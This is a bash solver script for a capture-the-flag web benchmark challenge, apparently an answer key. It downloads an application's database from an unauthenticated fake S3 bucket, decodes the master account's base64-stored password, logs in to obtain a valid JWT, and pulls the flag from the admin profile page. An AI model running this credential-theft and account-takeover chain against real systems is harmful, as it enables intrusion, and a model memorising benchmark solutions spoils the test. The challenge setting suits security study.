#!/usr/bin/env bash
# XBEN-084-24 — "S3aweed" (tags: information_disclosure, idor, jwt)
#
# Beside the web application sits a fake S3, reachable on its own port and with
# no credentials. Listing the service names its buckets — `assets`, which the
# site uses, and `backups`, which it does not. `backups` holds `manapool.db`:
# the application's SQLite database, users and passwords included.
#
# The passwords are stored base64-encoded, which is an encoding, so the master
# account's password comes straight back out. Logging in with it is not a
# forgery — the JWT the application issues is a real one, signed with a secret
# nobody had to learn, and `/adminpanel/profile` renders the flag for a user
# whose `isMaster` is set.
#
#   $2 is the fake S3's port. Without it, docker is asked which port the
#   container behind the given URL publishes for 8333.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT [s3-port]}"
H5I="${H5I:-h5i}"
SESSION="xben084-$$"
DB="$(mktemp)"
trap 'rm -f "$DB"; "$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

s3_port="${2:-}"
if [ -z "$s3_port" ]; then
    web_port="${URL##*:}"
    container="$(docker ps --format '{{.Names}} {{.Ports}}' | awk -v p=":$web_port->" '$0 ~ p {print $1; exit}')"
    s3_port="$(docker port "$container" 8333/tcp | head -1 | cut -d: -f2)"
fi

# The application first, so that request 0 is the one the later replays are
# edited from: a replay changes parts of a stored request, and the host is one
# of the parts it keeps.
"$H5I" browser open "$URL/adminpanel" --session "$SESSION" --new --capture >/dev/null

# Then the backup, byte for byte: a SQLite file is not something to read as text.
"$H5I" browser navigate "http://127.0.0.1:$s3_port/backups/manapool.db" \
    --session "$SESSION" >/dev/null
backup="$("$H5I" websec requests --session "$SESSION" |
    python3 -c '
import json, sys
rows = json.load(sys.stdin)["requests"]
print(max(r["seq"] for r in rows if r["url"].endswith("manapool.db")))
')"
"$H5I" websec show "res_$backup" --body-to "$DB" --session "$SESSION" >/dev/null

read -r email password <<<"$(python3 -c "
import base64, sqlite3, sys
rows = sqlite3.connect(sys.argv[1]).execute('select * from users').fetchall()
# The master flag is the column that is 1 for exactly one account.
for row in rows:
    if 1 in row[4:5] or row[4] == 1:
        print(row[1], base64.b64decode(row[3]).decode())
        break
" "$DB")"

seq="$("$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/api/auth' \
    --set 'header.Content-Type=application/json' \
    --set "json.email=$email" --set "json.password=$password" \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
token="$("$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import json,re,sys; print(re.search(r"\"token\":\"([^\"]+)\"", json.load(sys.stdin)["response"]["body"]["text"]).group(1))')"

seq="$("$H5I" websec replay req_0 --create \
    --set 'path=/adminpanel/profile' --set "header.Cookie=token=$token" \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
